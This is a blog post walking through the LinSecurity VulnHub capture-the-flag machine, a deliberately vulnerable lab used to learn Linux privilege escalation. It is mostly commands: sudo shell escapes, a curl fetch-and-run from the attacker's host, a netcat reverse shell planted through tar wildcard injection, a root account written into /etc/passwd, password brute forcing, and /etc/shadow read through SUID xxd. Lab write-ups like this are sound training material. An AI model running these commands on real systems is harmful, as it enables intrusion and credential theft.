---
layout: post-detail
title: CTF Linsecurity
date: 2018-10-28
categories: CTF
description: Walkthrough on the CTF LinSecurity iso at https://www.vulnhub.com/entry/linsecurity-1,244/
img-url: ''
comments: true
---

# Iso 

Get the ISO at https://www.vulnhub.com/entry/linsecurity-1,244/

# Target

    $ nmap -sS 192.168.1.0

```txt
Nmap scan report for 192.168.1.14
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
```

There is no web server, it change. A Quick TCP scan.

    $ sudo nmap -sC -sV -vv -oA quick 192.168.1.14

```txt
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4
111/tcp  open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
2049/tcp open  nfs_acl syn-ack ttl 64 3 (RPC #100227)
```

At [vulnhub](https://www.vulnhub.com/entry/linsecurity-1,244/), we have a message to start:

```txt
To get started you can log onto the host with the credentials: bob/secret
```

Let's connect to ssh:

    $ ssh bob@192.168.1.14

```txt

██╗     ██╗███╗   ██╗   ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
██║     ██║████╗  ██║   ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
██║     ██║██╔██╗ ██║   ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝
██║     ██║██║╚██╗██║   ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝
███████╗██║██║ ╚████║██╗███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║
╚══════╝╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝
Welcome to lin.security | https://in.security | version 1.0
```

Ok, so we are connect as bob, let's look at the /home
 
     $ ls /home
     bob peter susan

We found a `.secret` file in susan directory:

    $ ls -la /home/susan
    $ cat /home/susan/.secret
    MySuperS3cretValue

Check sudo perm:

    $ sudo -l
    [sudo] password for bob: secret

bob can run:

```txt
User bob may run the following commands on linsecurity:
    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh,
        /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed,
        /usr/bin/env, /usr/bin/expect, /usr/bin/find,
        /usr/bin/ftp, /usr/bin/less, /usr/bin/man,
        /bin/more, /usr/bin/scp, /usr/bin/socat,
        /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh,
        /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl,
        /usr/bin/tclsh, /usr/bin/git, /usr/bin/script,
        /usr/bin/scp
```

After found [gtfobins](https://gtfobins.github.io/), we'll try theses commands:

+ ash : `sudo ash`
+ awk : `sudo awk 'BEGIN {system("/bin/sh")}'`
+ bash : `sudo bash`
+ sh : `sudo sh`
+ csh : `sudo csh`
+ dash : `sudo dash`
+ ed : `sudo ed` (**and after**) `!/bin/sh`
+ env : `sudo env /bin/sh`
+ expect : `sudo expect -c 'spawn /bin/sh;interact'`
+ find : `sudo find . -exec /bin/sh \; -quit`
+ ftp : `sudo ftp` (**and after**) `!/bin/sh`
+ less : `sudo less /etc/profile` (**and after**) `!/bin/sh`
+ man : `sudo man man` (**and after (in the man)**) `!/bin/sh`
+ more : `sudo more /etc/shadow` (**and after**) `!/bin/sh`
+ scp : `TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x "$TF"; sudo scp -S $TF x y:`
+ ssh : `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
+ vi : `sudo vi -c ':!/bin/sh'`
+ zsh : `sudo zsh`
+ pico : `TERM=xterm; TF=$(mktemp); echo 'exec sh' > $TF; chmod +x $TF; sudo pico -s $TF /etc/hosts` (**and after**) `Ctrl+T`
+ perl : `sudo perl -e 'exec "/bin/sh";'`
+ tclsh : `sudo tclsh` (**and after**) `exec /bin/sh <@stdin >@stdout 2>@stderr`
+ git : `sudo git help status` (**and after**) `!/bin/sh` 
+ script : `sudo script -c '/bin/sh'`

Other commands who need more step:

### curl

We can use the perl method above in a script.  
On your pc, write the `shell.sh`:

```sh
cat >> shell.sh << EOF 
sudo perl -e 'exec "/bin/sh";'
EOF
```
    $ python2.7 -m SimpleHTTPServer 4444
    
On linsecurity:

    $ sh <(curl 192.168.1.56:4444/shell.sh)

### socat

We can write a little script like this:

```sh
cat >> socat.sh << EOF 
sudo socat TCP-LISTEN:9999,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane &
socat FILE:$(tty),raw,echo=0 TCP:127.0.0.1:9999
EOF 
```
And execute:

    $ sudo sh ./socat.sh

### rvim 

With rvim, we can create a new user directly with `/etc/passwd`:

     $ perl -le 'print crypt("pass123", "abc")'
     abBxjdJQWn8xw
     $ sudo rvim /etc/passwd

Add at the last line:

     captain:abBxjdJQWn8xw:0:0:/root/root/:/bin/bash
     :wq

Log as captain and you have all control :)

     $ su captain
     Passwd: pass123

Voila, we have run all commands.

# LinEnum.sh

Download and launch LinEnum.sh:

    $ cd /tmp
    $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    $ sudo sh LinEnum.sh

I've cut some parts:

### Bruteforce with hashcat

```sh 
-e [-] Contents of /etc/passwd:
insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh
-e
```
LinEnum.sh found a hash, we can bruteforce with JohnTheRipper or HashCat (more faster):

    $ wget -cv https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt
    $ hashcat AzER3pBZh6WZE -m 1500 rockyou-75.txt

### Bruteforce SSH 

```sh
-e [-] Root is allowed to login via SSH:
PermitRootLogin yes
-e
```
We can bruteforce ssh too with `root`, with a nice dictionnary (there are somes dictionnary at [github](https://github.com/danielmiessler/SecLists/tree/master/Passwords):

    $ hydra -t 4 -l root -P rockyou-75.txt 192.168.1.14 ssh

4 hour after, the command run again, not sure this dictionnary will work on the ssh :(

### Tar wildcard injection

```sh
-e [-] Crontab contents:
*/1 *   * * *   root    /etc/cron.daily/backup
-e
```
Look this file:

     $ cat /etc/cron.daily/backup

The script make backup of all user from `/home` at `/etc/backups/` with `tar`.

    $ ls /etc/backups
    home-bob.tgz  home-peter.tgz  home-susan.tgz

We going to try a technique call `tar wildcard injection`, this [post](http://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) explain how we can exploit that situation.  
In resume we can create some files with the same name than tar options like `--checkpoint` and tar will execute these commands... it just sucks :)

First on your pc, generate a payload type reverse\_netcat.

    $ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.32 lport=1234 R

Start netcat: 

    $ nc -lvp 1234

Copy the command under linsecurity:

    $ echo "mkfifo /tmp/phig; nc 192.168.1.32 1234 0</tmp/phig | /bin/sh >/tmp/phig 2>&1; rm /tmp/phig" > shell.sh
    $ echo "" > "--checkpoint-action=exec=sh shell.sh"
    $ echo "" > --checkpoint=1

And wait for the cron job start to become root.

    id 
    uid=0(root) gid=0(root) groups=0(root)

### Docker

```sh
-e [+] Looks like we're hosting Docker:
Docker version 18.03.1-ce, build 9ee9f40
-e
```
For docker, we can use [rootplease](https://hub.docker.com/r/chrisfosterelli/rootplease/).

    $ cd /tmp
    $ git clone https://github.com/chrisfosterelli/dockerrootplease
    $ docker run -v /:/hostOS -i -t dockerrootplease/rootplease

### SUID

A look at [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) to find a command to search suid file:

     $ find / -perm -u=s -type f -exec ls -ld {} \; 2>/dev/null
     -rwsr-x--- 1 root itservices 18552 Apr 10  2018 /usr/bin/xxd
     -rwsr-sr-x 1 root root 30800 May 16 10:41 /usr/bin/taskset
     
Search each commands on [gtfobin](https://gtfobins.github.io), only 2 will serve us.

First `taskset`:

    $ taskset 1 /bin/sh -p
     
And `xxd` is owned by a group `itservices`... Which user is part of it.

    $ grep itservices /etc/group
    itservices:x:1007:susan

We have found the `.secret` file at top:

    $ su susan
    Password: MySuperS3cretValue!

We can check the file `/etc/shadow` without the need of sudo:

    $ xxd /etc/shadow | xxd -r

So, this is a nice wm, i probably missed somes part like `NFS`, i am on `gentoo` and i'm lazy about recompile the kernel just for that :)
